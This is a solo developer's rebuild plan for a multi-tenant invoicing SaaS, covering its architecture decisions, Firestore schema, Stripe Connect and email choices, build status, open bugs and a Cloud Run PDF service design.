# TechFlow SaaS — Rebuild Plan

**Status:** Backend largely built, product screens not built, nothing deployed — see "Build Status, Decisions & Conventions" (audit 2026-09-13)
**Plan date:** 2026-04-11 · **Last reconciled with code:** 2026-09-13 (decisions D1–D5)
**Owner:** Reggie (solo dev)
**Scope:** Full rebuild of the TechFlow Solutions invoicing SaaS ("InvoicePro") into a multi-tenant Next.js + Tailwind app on a new repo, one pass, pre-launch.

---

## TL;DR — Decisions Locked

1. **Rebuild strategy:** One pass. New repo. Next.js 15 (App Router) + Tailwind + multi-tenant Firebase from day one. No intermediate Vite multi-tenant step.
2. **Scale target:** 50+ clients. Clone-per-client model is abandoned.
3. **Hosting:** Vercel Pro ($20/mo) for the Next.js app. PDF generation is NOT on Vercel — it runs on a dedicated Cloud Run service (see item 4).
4. **PDF generation:** Dedicated **Cloud Run** service running full Chrome + Puppeteer in a Docker container. Not Vercel. Separate microservice, protected by an API key, called from the Next.js app. This choice is locked — see "PDF Generation Strategy" section below.
5. **Firestore schema:** Nested per-tenant subcollections — `tenants/{tenantId}/invoices/{id}`, etc. Path-based tenant isolation.
6. **Tenant routing:** Implicit from auth claims. User logs in, `tenantId` is in their JWT, all queries scope to it. URLs stay generic (`/dashboard`, `/invoices`). Path/subdomain routing deferred.
7. **Stripe model:** Stripe Connect with Standard-equivalent controller properties (full Stripe Dashboard, direct charges, Stripe carries negative-balance liability) — D1, replacing Express. Tenants onboard their own Stripe account; platform takes no fee initially (toggleable later).
8. **Feature flags / entitlements:** Baked in from day one. Separate `entitlements` sub-document per tenant (platform-admin-only). Canonical feature list lives in code, tenant docs only store overrides. Frontend and Cloud Functions both enforce.
9. **CSS:** Tailwind. No plain CSS files. No `@import` chains.
10. **Customer portal access:** Contractors' end-customers (the homeowners being invoiced) authenticate via Firebase Auth magic link, have **no `tenantId` claim**, and can only read invoices/quotes where the document's `customer.email` matches their verified auth email. Separate `/portal` route group. Same auth backend, different authorization pattern.
11. **Firestore backup strategy:** Multi-tenant means one blast radius. Daily scheduled exports to Cloud Storage (30-day retention) + PITR (7 days) + documented manual-snapshot-before-risky-deploy convention. Enabled from day one, not "later."
12. **Pre-launch reality:** Zero real customers, zero real revenue. Current Firestore data is test-only and can be discarded. No regression risk from rewriting money-handling code.
13. **Post-build decisions (2026-09-13):** D1 Stripe account configuration, D2 Canadian regions, D3 card surcharging gated off, D4 per-line tax, D5 Amazon SES — see "Build Status, Decisions & Conventions". They override conflicting text elsewhere in this plan.

---

## Build Status, Decisions & Conventions (as of 2026-09-13)

> **Read this first.** This section records what was actually built (full audit 2026-09-13) and the post-build decisions D1–D5. Where older text in this plan conflicts with this section, **this section wins**. For exact document shapes and rule logic the code is authoritative: `firestore.rules`, `storage.rules`, `firestore.indexes.json`, `functions/src/shared/schema.ts`, `functions/src/shared/invoice.ts`, `src/lib/schema/tenant.ts`. Planning history (timeline estimates, April session notes, the plan revision log) moved to `REBUILD_PLAN_DEFERRED.md` → Appendix.

### Decision log — post-build (2026-09-13)

| # | Decision | Why | Where it lives |
|---|---|---|---|
| D1 | Stripe connected accounts use **controller properties equivalent to Standard**: `losses.payments=stripe`, `fees.payer=account`, `requirement_collection=stripe`, `stripe_dashboard.type=full`. Direct charges unchanged. Replaces legacy `type: "express"`. | Legacy Express made TechFlow liable for every tenant's negative balance and paid per-account Connect fees while taking no platform fee, and Stripe deprecated the account `type` parameter. Contractors are merchant of record and handle refunds/disputes in their own full Stripe Dashboard. Dashboard type is immutable per account, so it had to be right before the first tenant. | `functions/src/stripe/startConnectOnboarding.ts`; account lifecycle events on the Connect webhook (`src/app/api/webhooks/stripe/connect/route.ts`, `handlers.ts`) |
| D2 | **All compute in Canada.** Firestore `northamerica-northeast2` (Toronto); callables, HTTP functions, and Firestore triggers `northamerica-northeast2`; scheduled functions `northamerica-northeast1` (Montréal — Cloud Scheduler is not offered in Toronto); Cloud Run `pdf-service` `northamerica-northeast2`; Vercel functions `yul1`; SES `ca-central-1`. | Functions next to Firestore (latency), Canadian data residency for law/accounting/dental clients, and the Firestore location is permanent per project. | `functions/src/shared/globalOptions.ts` (first import in `functions/src/index.ts`), `src/lib/firebase/client.ts`, `vercel.json`, `functions/test/shared/regions.test.ts` |
| D3 | **Card surcharging ships disabled** behind the `cardSurcharge` feature flag (default `false`). The frozen `tenantSnapshot` is the single source for the surcharge shown and charged; the flag is a kill switch on top. | Checkout cannot tell credit from debit/prepaid, which Visa/Mastercard forbid surcharging, and Quebec is not auto-excluded. Re-enable per tenant only once card-funding detection (Stripe automatic surcharge or a compliance partner) is integrated. | `functions/src/shared/features.ts`, `surcharge.ts` (`effectiveCardSurcharge`), `updatePaymentSettings.ts`, `createPayTokenCheckoutSession.ts`, `verifyInvoicePayToken.ts`, `/settings/payments` |
| D4 | **Per-line tax.** Every line item stores `taxable` (defaults to the document's `applyTax`); totals carry `taxableSubtotal` and `taxes[]` (one entry per tax) alongside aggregate `taxRate`/`taxAmount`. PDFs render one row per tax and mark exempt lines when an invoice mixes both. | Mixed taxable/exempt supplies are common (e.g. HST-exempt dental services). Invoices are frozen legal documents, so the shape had to be right before real data. `taxes[]` makes GST+PST/QST provinces an additive change; rates stay single-tax (GTA HST) for MVP. | `functions/src/shared/invoice.ts` (`validateLineItems`, `resolveLineItems`, `computeInvoiceTotals`), `pdf-service/src/templates/*.hbs` |
| D5 | **Amazon SES replaces Resend** (supersedes Decision #3 below). React Email templates unchanged; transport, idempotency, bounce feedback, and owner incident alerts rebuilt on SES. | Production SES access with `techflowsolutions.ca` verified; SES tenant isolation gives per-tenant reputation protection; one email credential location (Cloud Functions only). | `functions/src/emails/send.ts`, `sesEvents.ts`, `functions/src/stripe/onPaymentIncidentCreated.ts` — see Phase 2 "React Email + Amazon SES" |

### As-built conventions (override older code samples in this plan)

| Topic | As built |
|---|---|
| Tenant settings doc | `tenants/{tenantId}/meta/settings` (not `tenants/{id}/meta`) |
| Entitlements doc | `tenants/{tenantId}/entitlements/current` — `{ plan, maxInvoicesPerMonth, features: {}, updatedAt }`; missing feature keys fall through to code defaults |
| Counters | `tenants/{tenantId}/counters/invoice` and `counters/quote`, field `value` |
| Document ids | Invoice id = invoice number (`{invoicePrefix}-0001`); quote id `QT-0001` (custom prefixes: A-12) |
| Roles | `owner` \| `admin` \| `staff` (older text says `member`) |
| Platform admin | Custom claim `platformAdmin: true` + `platformAdmins/{uid}`, granted by `functions/src/scripts/setPlatformAdmin.ts` (older text says `role: platform_admin`). No rule lets any client write entitlements; plans and feature overrides are edited in the Firebase Console. |
| User doc | `users/{uid}` — `{ uid, email, displayName, defaultTenantId, createdAt }` (older text says `primaryTenantId`) |
| Writes | Every tenant collection is `allow write: if false`; all mutations go through callables |
| Money | Dollars rounded to cents server-side; Stripe amounts in cents (`paidAmountCents`, `surchargeAmountCents`) |
| Payment method | `manual` \| `etransfer` \| `cash` \| `card` (the Stripe webhook writes `card`) |
| Custom-domain stage | `unverified` \| `dns_pending` \| `ssl_pending` \| `verified` \| `error` |
| Stripe webhooks | `/api/webhooks/stripe/platform` (platform scope, no handlers today) and `/api/webhooks/stripe/connect` (connected-account scope: payments, refunds, disputes, `account.updated`, `account.application.deauthorized`) |
| Email | Amazon SES from Cloud Functions only; From `"{Tenant}" <notifications@techflowsolutions.ca>`, Reply-To `meta.contactEmail` → `meta.etransferEmail` |
| Firebase projects | `techflow-saas-dev` (exists), `techflow-saas-staging`, `techflow-saas-prod` (`.firebaserc` aliases `dev`, `staging`, `prod`) |

### Phase status

| Phase | Status | Remaining |
|---|---|---|
| 1 Schema, rules, claims | Mostly done — 42 Firestore + 18 Storage rules tests | Recurring collection-group index (A-04); customer + recurring-management callables (A-10) |
| 1.5 Design system | Done | — |
| 2 Cloud Functions | Mostly done — 246 callable, 55 email, 54 shared tests | `getCustomerQuotes` (P6), MagicLinkSignIn + PaymentReceipt templates, App Check + send rate limits (R4), Sentry in functions |
| 3 Frontend architecture | Contexts, guards, auth recovery done | 12 placeholder pages: `/dashboard`, `/invoices`, `/invoices/new`, `/invoices/[id]`, `/customers`, `/quotes/[id]`, `/portal`, `/portal/invoices/[id]`, `/portal/quotes/[id]`, `/pay/[token]`, `/pay/[token]/success`, `/pay/[token]/cancelled`; dashboard navigation |
| 4 Stripe Connect | Backend done (D1 applied) | Public pay page UI; A-02, A-03, A-08 |
| 5 Onboarding & domains | Signup, login, settings, team, domain, billing UI done; host-routing middleware loads | Customer magic-link sign-in (portal login is password-only today); A-07 |
| 6 PDF | Code done — 222 tests | Deploy; Node 22 base image |
| 7 Testing & first onboarding | Bundles A–E done | Test matrix, staging project, backup restore drill, first onboarding |
| Deploy | Nothing deployed | "Environment Strategy & Deploy Runbook" |

### Confirmed open bugs (fix before the first tenant)

| Ref | Bug | Where | Fix |
|---|---|---|---|
| A-02 | Payment saves `session.payment_intent` (`pi_…`) as `stripeChargeId`; refund and dispute handlers look up `charge.id` (`ch_…`), so they never match | `src/app/api/webhooks/stripe/handlers.ts` | Store `stripePaymentIntentId`; look up by `charge.payment_intent` |
| A-03 | Event sentinel is written before the handler runs; a failed handler is never retried (redelivery sees "duplicate") | `src/lib/stripe/idempotency.ts`, webhook routes | `processing` → `done` states; release on failure |
| A-04 | `processRecurringInvoices` collection-group query (`status ==` + `nextRunAt <=`) has no composite index — fails in production (the emulator doesn't enforce indexes) | `firestore.indexes.json` | Add the `recurringInvoices` COLLECTION_GROUP index |
| A-05 | `getCustomerInvoices` (and the customer rule branch) include drafts; list rows carry full base64 logos (callable 10 MB limit at ~20 rows) | `functions/src/portal/getCustomerInvoices.ts`, `firestore.rules` | Exclude `draft`; project a small logo URL |
| A-06 | Emails embed the snapshot's base64 `data:` logo, which Gmail web and Outlook block | `sendInvoiceEmail.ts`, `sendQuoteEmail.ts`, `processRecurringInvoices.ts` | Copy the logo to an immutable public Storage path at snapshot time; use that https URL in email |
| A-07 | Edge Config keys `domain:{host}` contain `:` and `.`, but keys must match `^[\w-]+$` — every write fails silently | `src/middleware.ts`, `functions/src/domain/setupCustomDomain.ts` | Encode the host into a valid key in one shared helper |
| A-08 | Sent invoices can be edited (amount, customer email) without bumping `payTokenVersion`; the webhook marks paid without comparing `amount_total` | `updateInvoice.ts`, `handlers.ts` | Bump the version on edits of a sent invoice; verify the amount before marking paid |
| A-10 | No callables to create/update/delete customers or pause/resume/cancel recurring templates, while rules block client writes | `functions/src/index.ts`, `firestore.rules` | `upsertCustomer`, `deleteCustomer`, `updateRecurringInvoice` |
| A-12 | Smaller: `useAuth.ts` types roles as `member`/`platform_admin`; `deleteInvoice` hard-deletes sent invoices (should become `void`); `createQuote` prefix only maps `INV→QT`; the `onSignup` membership check isn't transactional | various | — |

Closed by the D-decisions: A-09 (surcharge shown vs charged — D3), A-11 (email sending duplicated in five places — D5), forced `business_type: "company"` on Stripe accounts (D1), P10 (email delivery feedback — D5).

Fixed: A-13 (2026-09-13) — `storage.rules` used `logo.{ext}`, invalid path syntax, so the ruleset never loaded. It now matches `/tenants/{tenantId}/{fileName}` and validates the file name, content type, and size; covered by `functions/test/rules/storage.test.ts`.

Fixed: A-01 (2026-09-13) — `middleware.ts`, `instrumentation.ts`, and `instrumentation-client.ts` moved into `src/`, so Next.js loads them (the build's functions-config manifest lists `/_middleware` on the Node.js runtime). The middleware now also strips any client-supplied `x-tenant-id` before routing. Covered by `src/__tests__/middleware.test.ts`.

### Platform deadlines

- **Next.js:** on 15.5.25 (includes the May–August 2026 security releases; the critical RCE was fixed in 15.5.24). Next 15 reaches end of life on 2026-10-21 — move to Next 16 before then (`src/middleware.ts` becomes `src/proxy.ts`, which is Node-only, so its `config.runtime` line is removed).
- **Node.js:** Cloud Functions decommissions Node 20 on 2026-10-30. Move `functions/package.json` engines, `firebase.json` runtime, and the `pdf-service` Dockerfile to Node 22 (firebase-functions 7 and firebase-admin 14 require it).

### Path to launch (in order)

1. ~~Next 15.5.25 and move the A-01 files into `src/`.~~ Done 2026-09-13.
2. Platform upgrade: Node 22, firebase-functions 7, firebase-admin 14, firebase-tools 15, Next 16.
3. Backend fixes A-02 → A-12, each with a test that would have caught it.
4. Product screens: Phase 3 placeholders, public pay page, portal magic-link sign-in.
5. Stand up staging, then prod, per the Deploy Runbook.
6. Phase 7 test matrix, backup restore drill, first onboarding.

---

## ⚠️ Old-Repo Shutdown Checklist (Path A decided 2026-04-11)

Old Vite repo has unauthenticated callables (`previewInvoicePDF`, `previewQuotePDF`, `sendQuoteEmail`, `sendInvoiceEmail`, `createCheckoutSession`). No real customers, pre-launch Stripe account → accepting the risk window rather than patching. **On rebuild launch day:** delete the old Firebase project (or at minimum its Cloud Functions) AND take down the old GitHub Pages site. Both required — not one or the other. Rebuild enforces `auth + tenantId + featureGate` natively from commit 1.

---

## Background — Why This Rebuild

### Current stack (being replaced)
- Vite 7.3.1 + React 19.2.0, plain CSS per component
- Firebase Auth + Firestore (single project per client, clone model)
- Firebase Cloud Functions (email via Zoho, Stripe, recurring invoices, invoice numbering)
- Cloud Run + Puppeteer for PDF (shared across all clients)
- GitHub Pages per client, GitHub Actions deploy
- 15-phase manual clone process per new client

### Problems with current architecture
- **Clone-per-client is operational debt that compounds per client.** Pushing one bug fix means N manual deploys. Config drift is inevitable. At 10+ clients it becomes a full-time release-management job for a solo dev.
- **Per-client Firebase projects** = per-client billing, quotas, bug triage, DNS, OAuth setup.
- **Plain CSS with `@import` chains** has already caused real cascade/specificity bugs (the `.form-group { margin: 0 }` leak from ServiceCalculator that wiped CustomerSection's spacing).
- **Stack drift** with the main marketing site, which is already on Next.js + Tailwind on Vercel. Standardizing cuts cognitive overhead and unifies the dev surface.
- **No data migration penalty** because no real customers exist yet — pre-launch is the only cheap window for this rebuild.

### Bundled website + portal offering (why branding is critical)
TechFlow's go-to-market is a **bundled service**: Reggie builds the client's website AND their invoice portal together as a package. Because TechFlow builds their website too, the portal must match the client's brand exactly — same colours, same fonts, same logo, same feel. This is not a nice-to-have; it's core to the product. A portal that looks like "TechFlow" instead of "Smith Plumbing" undermines the bundled pitch. This is why:
- Full branding fields (`primaryColor`, `secondaryColor`, `fontFamily`, `logoUrl`, `faviconUrl`) are required from Phase 1, not deferred.
- Custom domain support (`invoices.smithplumbing.ca`) is a Phase 5 deliverable, not post-launch.
- The customer-facing login page must render the tenant's branding when accessed via a custom domain.

### Why not a smaller step (Vite multi-tenant first, Next.js later)
Two rebuilds = ~10 weeks total and two transition states. One rebuild into the final stack = ~6–8 weeks and one transition state. Same queries, same security rules, same Cloud Function auth — but written once in the destination stack.

---

## PDF Generation Strategy — Cloud Run (locked)

### Why Cloud Run, not Vercel

PDF generation runs as a **dedicated Cloud Run microservice**, not inside the Vercel app. This was evaluated against the Vercel + `@sparticuz/chromium` alternative and Cloud Run wins for this app:

- **Already working.** The old Vite repo's Cloud Run PDF service works today. Porting it beats rebuilding PDF rendering on a new platform.
- **Full Chrome in Docker, no hacks.** A standard Dockerfile installs stable Google Chrome. No `@sparticuz/chromium` binary, no version-pinning dance against `puppeteer-core` majors, no Next.js `serverExternalPackages` config, no 250 MB bundle ceiling to tiptoe around.
- **Real RAM headroom.** Cloud Run allows 2–32 GB per instance. Vercel Pro tops out at ~3 GB per function. Puppeteer spikes on complex invoices (many line items, custom fonts) can trip Vercel's ceiling and return silent failures.
- **Separation of concerns.** Vercel stays lean (UI + lightweight API routes). The heavy-lifting PDF service can be scaled, monitored, and redeployed independently. Classic microservice split.
- **Load distribution.** Keeps Vercel function concurrency for user-facing requests instead of burning it on 3–5-second PDF renders.
- **Local dev parity.** `docker run` locally is byte-identical to prod. Vercel's sparticuz Chromium isn't what runs on your dev machine.

### Service shape

```
pdf-service/
  Dockerfile                   ← base image with Chrome stable pre-installed
  package.json
  src/
    index.ts                   ← small Express (or Hono) app
    renderInvoice.ts           ← Puppeteer render logic
    renderQuote.ts
```

- Deployed as a single Cloud Run service per environment (`pdf-service-dev`, `pdf-service-staging`, `pdf-service-prod`).
- Memory: 2 GB. vCPU: 2. Concurrency: 10–20 per instance (Chrome is not thread-safe but one instance can handle multiple serialized requests).
- `min-instances: 0` for dev/staging (scales to zero), `min-instances: 1` for prod if cold starts become a UX problem (costs a few dollars a month for always-warm).

### Auth — API key + Firebase ID token forwarding

The Cloud Run service is NOT publicly open. Two layers:

1. **Cloud Run `PDF_SERVICE_API_KEY`** — a shared secret between the Next.js app and the PDF service. Next.js sends `X-Api-Key: <secret>`. PDF service rejects anything else with 401. Prevents randoms from hitting the endpoint and running up bills.
2. **Firebase ID token forwarding** — the Next.js route that proxies to Cloud Run does the dual-auth check FIRST (tenant user vs customer email match, per Phase 6), then forwards the verified invoice payload + snapshot to Cloud Run. Cloud Run does NOT re-verify Firebase tokens — it trusts the gating done by the Next.js route. The API key is what protects Cloud Run itself.

This keeps PDF service stateless and fast: it receives `{ html, snapshot }` (or `{ invoiceData }`) and returns a PDF buffer. All tenant/customer authorization happens upstream.

### Dockerfile sketch

```dockerfile
FROM node:20-slim

# Install Chrome stable + fonts
RUN apt-get update && apt-get install -y \
    google-chrome-stable \
    fonts-liberation fonts-noto-color-emoji \
    --no-install-recommends \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .

ENV PUPPETEER_EXECUTABLE_PATH=/usr/bin/google-chrome-stable
EXPOSE 8080
CMD ["node", "src/index.js"]
```

(Final Dockerfile tuning — user namespace, non-root user, sandbox flags — happens during Phase 6 porting, not now.)

### Env vars (set per Cloud Run service)

- `PDF_SERVICE_API_KEY` — shared secret
- `NODE_ENV` — `production`

### Next.js side

- `/api/pdf/invoice/route.ts` and `/api/pdf/quote/route.ts` are **thin proxies**:
  1. Verify Firebase ID token (dual auth: tenant vs customer)
  2. Feature-gate check (`invoices` / `quotes` enabled for the target tenant)
  3. Load invoice/quote doc from Firestore (server-side with Admin SDK)
  4. POST to Cloud Run with `{ snapshot, data }` + `X-Api-Key`
  5. Stream the PDF buffer back to the caller
- Env var: `PDF_SERVICE_URL` (the deterministic `https://pdf-service-prod-<PROJECT_NUMBER>.northamerica-northeast2.run.app`) and `PDF_SERVICE_API_KEY`, set per Vercel environment scope.

### Deployment

- `gcloud run deploy pdf-service-prod --source ./pdf-service --region northamerica-northeast2` (D2 — same region as Firestore). Full flags and the deterministic service URL are in the Deploy Runbook.
- One service per environment (dev/staging/prod), same as Firebase projects.
- Script this alongside the Cloud Functions deploy script (see "Environment Strategy" → Cloud Functions deployment).

### No Puppeteer test on Vercel

The previously-planned 30–60 min Puppeteer test on the marketing site is **removed**. It was testing a path we're not taking. Immediate Next Steps drops that item; Phase 1 can start without it.

---

## Phase 0 — Decisions Before Any Code

All confirmed:

| Question | Decision |
|---|---|
| Schema shape | **Nested subcollections** — `tenants/{tenantId}/invoices/{id}` |
| Tenant routing | **Implicit from auth claims.** `tenantId` in JWT, queries scope automatically |
| Stripe model | **Stripe Connect, Standard-equivalent controller properties (D1; was Express).** Tenants onboard via Stripe, money flows to their account |
| Feature flags | **Separate `entitlements` sub-doc, platform-admin-only, code-canonical feature list** |
| Branding surface | **Full branding required from Phase 1.** Name, logo, address, email-from, primaryColor, secondaryColor, fontFamily, faviconUrl. Not deferred — core to the bundled website + portal offering |
| Custom domains | Field in meta from Phase 1. Vercel domain provisioning + branded login middleware in Phase 5. Two tiers: generic `portal.techflowsolutions.ca` (immediate) and custom `invoices.smithplumbing.ca` (DNS + SSL) |
| tenantSnapshot policy | **Frozen at creation time (legal document approach).** Invoices/quotes embed a branding snapshot when created. If a contractor rebrands later, old documents keep the branding they were sent with. This is correct for tax/legal documents and avoids cross-doc reads in security rules. PDFs always render from the snapshot, never from current `meta`. |
| Environment strategy | **Separate Firebase projects for dev/staging/prod.** Stripe test vs live keys per Vercel environment scope. See "Environment Strategy" section below Phase 7. |
| CSS approach | Tailwind only. No plain CSS files |
| Stack | Next.js 15 App Router + Tailwind + TypeScript |

---

## Decisions Required Before Phase 1 Starts

These are not "open questions to answer later" — they block Phase 1 setup and must be resolved before the first Firebase project is provisioned or the first line of code is written.

### 1. Generic portal domain: subdomain of marketing site vs separate Vercel project

**The decision:** Where does `portal.techflowsolutions.ca` (the generic portal URL) live?

**Option A — Same Vercel project as the marketing site.**
- Pros: one deployment, one set of env vars, single Firebase Auth authorized domain for the root domain.
- Cons: the Next.js middleware (which resolves tenant from custom domains) would run on EVERY request including marketing pages. Adds latency and a Firestore read to every marketing page load. Middleware has to be careful to early-return for marketing hostnames. Couples the marketing site's deploy cadence to the portal's.

**Option B — Separate Vercel project.**
- Pros: marketing site stays simple, no middleware on marketing routes. Portal can deploy independently. Clean separation of concerns.
- Cons: two Vercel projects to maintain, two sets of env vars, two Firebase Auth authorized domains lists (though both point to the same Firebase project). Slight DNS complexity (marketing site on `techflowsolutions.ca`, portal on `portal.techflowsolutions.ca` — CNAME to a different Vercel project).

**Recommendation:** Option B (separate Vercel project). The marketing site and the portal are fundamentally different apps with different deploy risk profiles. The per-request middleware cost is small in absolute terms but there's no reason to pay it on marketing pages. Two Vercel projects is trivial overhead for a solo dev.

**✅ RESOLVED 2026-04-13 — Option A (single Vercel project).** Decision made jointly with Gemini review. Rationale: middleware-based host routing is the industry-standard pattern at this scale; single project keeps CI/CD, env vars, and shared utility code (brand contrast logic, tenant resolver, etc.) in one place. The per-request middleware cost is mitigated by early-return for known marketing hostnames. Reconsider splitting only if marketing-page latency becomes measurable.

### 2. Path A vs Path B for old-repo security debt

Already decided — see "Outstanding Security Debt" section above. Path A (ship rebuild, delete old project on launch day). Listed here for completeness so this section is a single checklist of pre-Phase-1 decisions.

### 3. Transactional email provider — Zoho vs Resend/Postmark

**The decision:** Which service sends invoice emails, magic links, and staff invitations? This blocks Phase 2 (`sendInvoiceEmail` cannot be written without knowing the From address and SDK).

**Option A — Keep Zoho (current platform sender).**
- Pros: zero new services to learn, existing Zoho account works, cheap.
- Cons: **high reputation risk at multi-tenant scale.** Zoho is a standard mailbox provider, not a transactional ESP. If one tenant's invoices get flagged as spam (aggressive collections, too-many-recipients, bad-text patterns), Zoho throttles or blocks the sending address — affecting *every other tenant*. One bad actor poisons the platform. Deliverability is mediocre for bulk-ish sends. No built-in bounce/complaint handling.

**Option B — Switch to Resend or Postmark (transactional ESP).**
- Pros: built for exactly this pattern (multi-tenant SaaS sending on behalf of customers). Clean IPs, proper DKIM/SPF alignment, bounce + complaint webhooks, per-domain reputation so one tenant's bad sends can't tank another's. Easy SDK. Both have generous free tiers (Resend: 3k/month, Postmark: 100/month then $1.25/1000).
- Cons: one more SaaS dependency, one more API key per environment.

**Reply-To strategy (applies either way):**
- `From:` `notifications@techflowsolutions.ca` (or equivalent — the platform's single verified sender)
- `Reply-To:` the tenant's own email from `meta` (e.g. `contractor@smithplumbing.com`)
- End customers hit "Reply" and it goes to the contractor, not to Reggie. This is non-negotiable for a bundled-website offering.

**Recommendation:** Option B — Resend. It's built for this, free tier covers MVP, and it's the single biggest deliverability risk-mitigation the plan can make. Postmark is also fine but Resend has the nicer DX.

**⚠️ SUPERSEDED 2026-09-13 by D5 — Amazon SES.** Resend was never deployed. Production SES access with `techflowsolutions.ca` verified made SES the better fit: per-tenant reputation isolation through SES tenants and a single email credential location in Cloud Functions. See Phase 2 "React Email + Amazon SES". The April analysis below is kept for rationale.

**✅ RESOLVED 2026-04-13 — Resend.** Decision made jointly with Gemini review. Rationale: pairs natively with React Email (the template system locked in Phase 2) — templates are JSX components using the same design tokens as the dashboard, so a "Paid" badge in an email renders identically to one in the portal. Eliminates hand-rolled HTML tables. Free tier (3k/month) covers MVP.

**Downstream changes (as built with SES, D5):**
- Cloud Functions secrets `AWS_SES_ACCESS_KEY_ID` / `AWS_SES_SECRET_ACCESS_KEY`; no email credentials on Vercel.
- `sendInvoiceEmail`, `sendQuoteEmail`, the recurring processor, `createInvitation`, and owner incident alerts all send through `functions/src/emails/send.ts` with `From: "{Tenant}" <notifications@techflowsolutions.ca>` and `Reply-To: meta.contactEmail` (falling back to `meta.etransferEmail`). A branded magic-link sender is not built yet.
- Verify `techflowsolutions.ca` in SES `ca-central-1` (Easy DKIM, custom MAIL FROM, existing DMARC) — see the Deploy Runbook.

**Status:** Decided — Resend (2026-04-13), superseded by Amazon SES (D5, 2026-09-13).

---

## Phase 1 — Data Model, Auth Claims, Security Rules

### Firestore structure

As built (reconciled 2026-09-13). Every collection below is **admin-SDK-write-only** — clients read what `firestore.rules` allows and mutate through callables.

```
tenants/{tenantId}                         ← tenantId = business-name slug (+ -1, -2 on collision)
  ├─ meta/settings                (doc)    ← edited via updateTenantBranding / updatePaymentSettings;
  │    {                                     read by tenant members
  │      name, logoUrl, address,            ← logoUrl = public https download URL (getDownloadURL),
  │                                           never the Storage path
  │      contactEmail,                      ← Reply-To on customer emails (D5); defaults to the
  │                                           owner's signup email
  │      primaryColor, secondaryColor,      ← WCAG AA vs white enforced server-side
  │      fontFamily, faviconUrl,
  │      customDomain,
  │      customDomainStatus: { stage, message, checkedAt },
  │        stage: 'unverified' | 'dns_pending' | 'ssl_pending' | 'verified' | 'error'
  │      taxRate, taxName,                  ← e.g. 0.13, "HST"
  │      businessNumber, invoicePrefix, emailFooter,
  │      currency,                          ← 'CAD' | 'USD'
  │      stripeAccountId,
  │      stripeStatus: { chargesEnabled, payoutsEnabled, detailsSubmitted,
  │                      currentlyDue[], disabledReason, updatedAt },
  │      etransferEmail,
  │      chargeCustomerCardFees,            ← effective only while `cardSurcharge` is on (D3)
  │      cardFeePercent,                    ← hard-capped at 2.4
  │      surchargeAcknowledgedAt,
  │      deletedAt, createdAt, updatedAt
  │    }
  ├─ entitlements/current         (doc)    ← platform admin edits in Firebase Console
  │    { plan, maxInvoicesPerMonth, features: { …overrides }, updatedAt }
  ├─ counters/invoice, counters/quote      ← { value, updatedAt }
  ├─ customers/{id}                        ← read-only to clients; callables pending (A-10)
  ├─ invoices/{invoiceNumber}              ← see "Invoice document" below
  │    ├─ payAttempts/{id}                 ← { createdAt, expireAt, sessionId } — TTL 48h
  │    └─ paymentIncidents/{kind}_{stripeObjectId}
  │                                        ← { kind, …details, createdAt } — audit + owner
  │                                           email trigger (D5)
  ├─ quotes/{quoteNumber}                  ← invoice shape without pay/payment fields,
  │                                           plus validUntil, convertedToInvoiceId
  ├─ recurringInvoices/{id}                ← template: customer, lineItems, applyTax, totals,
  │                                           notes, internalDescription, daysUntilDue, interval,
  │                                           anchorDay, startDate, nextRunAt, endAfterCount,
  │                                           endDate, autoSend, status, generatedCount,
  │                                           lastRunAt/Status/Error, consecutiveFailures,
  │                                           lastGeneratedInvoiceId
  └─ invitations/{inviteId}
       { tenantId, email (lowercased), role, tokenHash, invitedBy, createdAt,
         expiresAt, acceptedAt, acceptedBy, revokedAt, revokedBy }

users/{uid}                                ← tenant users only; customers have no doc
  { uid, email, displayName, defaultTenantId, createdAt, updatedAt }

userTenantMemberships/{uid}_{tenantId}     ← one per (user, tenant); MVP allows one active tenant
  { uid, tenantId, role: 'owner' | 'admin' | 'staff', invitedBy, createdAt, deletedAt }

customDomains/{domain}        { tenantId, createdAt }                 ← middleware fallback lookup
stripeAccounts/{accountId}    { tenantId, linkedAt }                  ← Connect webhook routing;
                                                                        written at account creation
stripeEvents/{eventId}        { type, account, livemode, receivedAt, expireAt }    ← TTL 30 days
emailSends/{sha256(key)}      { status, category, tenantId, documentId,
                                claimedAt, expireAt, messageId, sentAt }           ← TTL 30 days (D5)
platformAdmins/{uid}          { uid, email, grantedAt, grantedBy }
```

**Invoice document** — `tenants/{tenantId}/invoices/{invoiceNumber}`:

```
{
  customer: { name, email (lowercased), phone },
  lineItems: [{ description, quantity, rate, taxable, amount }],  ← taxable per line (D4)
  applyTax,                                 ← default taxability for lines that don't specify
  totals: { subtotal, taxableSubtotal, taxRate, taxAmount,
            taxes: [{ name, rate, taxableAmount, amount }], total },
  tenantSnapshot: { …frozen branding — see next section },
  status: 'draft' | 'sent' | 'unpaid' | 'overdue' | 'partial' | 'paid'
          | 'refunded' | 'partially-refunded',
  issueDate, dueDate,                       ← 'YYYY-MM-DD'
  notes,
  payToken, payTokenExpiresAt (display only), payTokenVersion,
  createdAt, createdBy, updatedAt, sentAt,
  sourceQuoteId, sourceRecurringInvoiceId,
  paidAt, paymentMethod ('manual' | 'etransfer' | 'cash' | 'card'),
  paidAmountCents, surchargeAmountCents, stripeChargeId,
  refundedAt, refundedAmountCents,
  disputed, disputedAt, disputeReason, disputeOutcome ('won' | 'lost'),
  lastEmailStatus ('delivered' | 'bounced' | 'complained' | 'delayed' | 'rejected'),
  lastEmailStatusDetail, lastEmailMessageId, lastEmailStatusAt       ← SES events (D5)
}
```

### Invoice/quote branding snapshot (denormalization rule)

**Every invoice and quote document embeds a `tenantSnapshot` subfield at creation time**, containing the fields the customer portal needs to render the document without reading `meta`:

```typescript
{
  // ... invoice data (customer, lineItems, totals, status, etc.) ...

  tenantSnapshot: {
    name, logo, address,                   // ← `logo` is an inlined base64 data URL frozen at
                                           //   snapshot time. See "Immutable logo snapshot" in
                                           //   Phase 6 — storing the current mutable Storage
                                           //   URL breaks historical PDFs when the tenant
                                           //   rotates or deletes their logo file.
    primaryColor, secondaryColor,
    fontFamily, faviconUrl,                // ← new: full branding
    taxRate, taxName, businessNumber,
    emailFooter, currency,
    chargeCustomerCardFees, cardFeePercent, // ← effective surcharge frozen at creation (D3)
    etransferEmail,
    version: 1,
    // NOTE: stripeAccountId intentionally NOT snapshotted.
    // It's read server-side from meta at checkout creation time.
    // NOTE: customDomain intentionally NOT snapshotted.
    // Domain routing is resolved by middleware, not by invoice docs.
  }
}
```

**Why snapshot instead of reading `meta` from the customer portal:**
1. **Simpler rules.** Customers only need read access to their own invoices, not to tenant meta. One rule covers it.
